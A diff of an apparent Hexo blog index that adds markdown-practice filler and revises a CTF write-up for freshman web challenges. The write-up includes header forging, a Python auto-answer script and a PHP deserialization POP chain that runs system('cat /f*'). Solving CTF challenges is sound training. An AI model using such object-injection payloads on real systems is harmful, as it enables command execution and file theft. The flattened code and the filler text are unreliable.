@@ -77,18 +77,58 @@
 
 
 
+<p>    asdfsd</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>    </p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>这个链接用 1 作为网址变量 <a href="http://www.google.com/" title="aaaaa">Google</a><br>这个链接用 runoob 作为网址变量 <a href="http://www.runoob.com/" title="bbbb">Runoob</a><br>然后在文档的结尾为变量赋值（网址）</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure>
 
 
 
 
 
 
+
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">  adsfasdfasdfasdf</span><br><span class="line">    dgre</span><br><span class="line">        sdfasdf</span><br><span class="line">    wwdsa</span><br><span class="line">            dfasdf</span><br><span class="line">    dasf</span><br></pre></td></tr></table></figure>
+
+
+
+<p>这是一个链接 <a href="https://www.runoob.com/" title="mincheng">菜鸟教程</a></p>
+<p><a href="https://markdown.com.cn/">https://markdown.com.cn</a></p>
+<p><a href="mailto:&#x32;&#x30;&#54;&#51;&#x36;&#x34;&#49;&#52;&#56;&#x36;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#109;">&#x32;&#x30;&#54;&#51;&#x36;&#x34;&#49;&#52;&#56;&#x36;&#x40;&#x71;&#x71;&#46;&#99;&#x6f;&#109;</a><br>    sdfasdf</p>
+<h3 id="图片"><a href="#图片" class="headerlink" title="图片"></a>图片</h3><img title="adddd" src="file:///C:/Users/SSJK/Pictures/Camera Roll/QQ图片20240103221231.jpg" alt="loading-ag-3983" data-align="inline">
+
+
+
+<p><a href="https://markdown.com.cn/"><img src="file:///C:/Users/SSJK/Pictures/Camera%20Roll/d5581ce18d322566400f20933799e716.jpg" alt="这是照骗" title="ooood"></a></p>
+<p>#</p>
 <h2 id="士大夫谁"><a href="#士大夫谁" class="headerlink" title="士大夫谁"></a>士大夫谁</h2>]]></content>
   </entry>
   <entry>
-    <title>24 Base 高校联合新生赛</title>
-    <url>/2024/09/25/24-Base-%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9B/</url>
-    <content><![CDATA[<h4 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a>[Week1] A Dark Room</h4><p><img src="https://rqa2yumzxmn.feishu.cn/space/api/box/stream/download/asynccode/?code=ZDc0NjY5ZWE1ZjYzNDY5NDYyYTk2Y2NhZDdlZGI0YzhfbTFObkVLRk9XN3dXcENQekhleHlrc05wSlFVbkJrdVpfVG9rZW46RzZWZ2JBUGZGb0hVOWV4UFAyU2NET1dobm1jXzE3MjcyMjcxOTM6MTcyNzIzMDc5M19WNA"></p>
+    <title>24 Base 高校联合新生赛web部分</title>
+    <url>/2024/09/25/%E9%AB%98%E6%A0%A1%E8%81%94%E5%90%88%E6%96%B0%E7%94%9F%E8%B5%9Bweb%E9%83%A8%E5%88%86/</url>
+    <content><![CDATA[<h4 id="Week1-A-Dark-Room"><a href="#Week1-A-Dark-Room" class="headerlink" title="[Week1] A Dark Room"></a>[Week1] A Dark Room</h4><blockquote>
+<p>s</p>
+</blockquote>
+<p><img src="file:///D:/wode123/bolg/source/_posts/img/bk1/89d99cdc-c64e-49d1-8c2d-80d8d6c5effa.png" alt="asdf" title="aaaaaaa"></p>
+<p>  <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br></pre></td></tr></table></figure><br>    adsfasdfasdfasdf<br>    dgre<br>        sdfasdf<br>    wwdsa<br>            dfasdf<br>    dasf</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">这是一个链接 [菜鸟教程](https://www.runoob.com &quot;mincheng&quot;)</span><br><span class="line"></span><br><span class="line">&lt;https://markdown.com.cn&gt;</span><br><span class="line"></span><br><span class="line">&lt;2063641486@qq.com&gt;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">```java</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">sdfasdf</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
 <h4 id="Week1-HTTP-是什么呀"><a href="#Week1-HTTP-是什么呀" class="headerlink" title="[Week1] HTTP 是什么呀"></a>[Week1] HTTP 是什么呀</h4><p>根据题目要求改报文的头部和传递参数</p>
 <p>其中：X-Forwarded-For 表示假的</p>
 <p><img src="https://rqa2yumzxmn.feishu.cn/space/api/box/stream/download/asynccode/?code=YTJjNDkyYmMyYTkxYWUzYWU5MWNmOGZkOTkzYmIzYThfWmV5am9mWFlsaGZFNmdKQTFxMUtpWFlPMXZsRHo4SWZfVG9rZW46VEgxRWJpWm90b2NqcnF4RHhoRWNHQzE0blVkXzE3MjcyMjcxOTM6MTcyNzIzMDc5M19WNA"></p>
@@ -139,17 +179,13 @@
 <p>查看：2.txt</p>
 <p><img src="https://rqa2yumzxmn.feishu.cn/space/api/box/stream/download/asynccode/?code=NjU1Y2ViOWJlNDA2NDFiMTQxZmMxYjg5NTJkNTVjNjRfWUdNU3Z0cUUyd25sRkI4bHBvT1JZUVBySXMzQkFSYUxfVG9rZW46T3hLRGJLcGIyb1NZZzN4YUJlVWNSdzdYbldoXzE3MjcyMjcxOTM6MTcyNzIzMDc5M19WNA"></p>
 <h4 id="Week2-数学大师"><a href="#Week2-数学大师" class="headerlink" title="[Week2] 数学大师"></a>[Week2] 数学大师</h4><p>考python语言</p>
-<p><img src="https://rqa2yumzxmn.feishu.cn/space/api/box/stream/download/asynccode/?code=YTFjMjcxNDJjODRmMjQ2NmM5NjA5ZDFhYTZhZTdhODJfeDVCY084WG42dWJ2NEFYMlR6UEtGeVgxaWRsZFBJeUZfVG9rZW46T3NXTGJYeTl0b0FKWEZ4aVhiSWNvRWV1bm1mXzE3MjcyMjcxOTM6MTcyNzIzMDc5M19WNA"></p>
-<pre><code>import requestsimport rereq = requests.session()url = &quot;http://challenge.basectf.fun:43995/&quot;answer = 0while True:    response = req.post(url , data=&#123;&quot;answer&quot;: answer &#125;)    print(response.text)    if &quot;BaseCTF&quot; in response.text:        print(response.text)        break    regex = r&quot; (\d*?)(.)(\d*)\?&quot;    match = re.search(regex, response.text)    if match.group(2) == &quot;+&quot;:        answer = int(match.group(1)) + int(match.group(3))    elif match.group(2) == &quot;-&quot;:        answer = int(match.group(1)) - int(match.group(3))    elif match.group(2) == &quot;×&quot;:        answer = int(match.group(1)) * int(match.group(3))    elif match.group(2) == &quot;÷&quot;:        answer = int(match.group(1)) // int(match.group(3))    print(answer)
-</code></pre>
+<p><img src="https://rqa2yumzxmn.feishu.cn/space/api/box/stream/download/asynccode/?code=YTFjMjcxNDJjODRmMjQ2NmM5NjA5ZDFhYTZhZTdhODJfeDVCY084WG42dWJ2NEFYMlR6UEtGeVgxaWRsZFBJeUZfVG9rZW46T3NXTGJYeTl0b0FKWEZ4aVhiSWNvRWV1bm1mXzE3MjcyMjcxOTM6MTcyNzIzMDc5M19WNA"><br>    import requestsimport rereq &#x3D; requests.session()url &#x3D; “<a href="http://challenge.basectf.fun:43995/%22answer">http://challenge.basectf.fun:43995/&quot;answer</a> &#x3D; 0while True:    response &#x3D; req.post(url , data&#x3D;{“answer”: answer })    print(response.text)    if “BaseCTF” in response.text:        print(response.text)        break    regex &#x3D; r” (\d*?)(.)(\d*)?“    match &#x3D; re.search(regex, response.text)    if match.group(2) &#x3D;&#x3D; “+”:        answer &#x3D; int(match.group(1)) + int(match.group(3))    elif match.group(2) &#x3D;&#x3D; “-“:        answer &#x3D; int(match.group(1)) - int(match.group(3))    elif match.group(2) &#x3D;&#x3D; “×”:        answer &#x3D; int(match.group(1)) * int(match.group(3))    elif match.group(2) &#x3D;&#x3D; “÷”:        answer &#x3D; int(match.group(1)) &#x2F;&#x2F; int(match.group(3))    print(answer)</p>
 <p>即可</p>
 <p>注意：**”÷”只能复制**</p>
 <h4 id="Week2-Really-EZ-POP"><a href="#Week2-Really-EZ-POP" class="headerlink" title="[Week2] Really EZ POP"></a>[Week2] Really EZ POP</h4><p>php反序列化</p>
-<p><img src="https://rqa2yumzxmn.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY0NmY0Y2IzYTk1ZjIwMTg0ZGMxMjEzZjZkNDI3MmFfS29sTm1la1c4SllKZ0dEN2VqUmtJb1Fmb1I0cndxWEVfVG9rZW46Sk9la2JTeEwwb0JTOUZ4VkhLNWNuaUVCblFmXzE3MjcyMjcxOTM6MTcyNzIzMDc5M19WNA"></p>
-<pre><code>&lt;?phpclass Sink&#123;    private $cmd = &quot;system(&#39;cat /f*&#39;);&quot;;&#125;class Shark&#123;    private $word;     /**
-     * @param mixed $word
-     */public function setWord($word)    &#123;        $this-&gt;word = $word;    &#125;&#125;class Sea&#123;    public $animal;&#125;class Nature&#123;    public $sea;    public $see;&#125;/*$nature = new Nature();$sea = new Sea();$sink = new Sink();$shark = new Shark();$sea-&gt;animal = $shark;$nature-&gt;sea = $sea;$shark-&gt;setWord($sink);echo urlencode(serialize($nature));*/$a= new Nature();$a-&gt;sea=new sea();$a-&gt;see=&#39;aaa&#39;;$a-&gt;sea-&gt;animal=new shark();$Sink= new Sink();$a-&gt;sea-&gt;animal-&gt;setWord($Sink);echo urlencode(serialize($a));?&gt;
-</code></pre>
+<p><img src="https://rqa2yumzxmn.feishu.cn/space/api/box/stream/download/asynccode/?code=NWY0NmY0Y2IzYTk1ZjIwMTg0ZGMxMjEzZjZkNDI3MmFfS29sTm1la1c4SllKZ0dEN2VqUmtJb1Fmb1I0cndxWEVfVG9rZW46Sk9la2JTeEwwb0JTOUZ4VkhLNWNuaUVCblFmXzE3MjcyMjcxOTM6MTcyNzIzMDc5M19WNA"><br>    <?phpclass Sink{    private $cmd = "system('cat /f*');";}class Shark{    private $word;     /**
+         * @param mixed $word
+         */public function setWord($word)    {        $this->word = $word;    }}class Sea{    public $animal;}class Nature{    public $sea;    public $see;}/*$nature = new Nature();$sea = new Sea();$sink = new Sink();$shark = new Shark();$sea->animal = $shark;$nature->sea = $sea;$shark->setWord($sink);echo urlencode(serialize($nature));*/$a= new Nature();$a->sea=new sea();$a->see='aaa';$a->sea->animal=new shark();$Sink= new Sink();$a->sea->animal->setWord($Sink);echo urlencode(serialize($a));?></p>
 <p>注意：</p>
 <p><strong>单独设置了 setWord($word)函数，</strong></p>
 <p><strong>因为出现private 变量，private $word需要在操作时需要对$word改变值</strong></p>
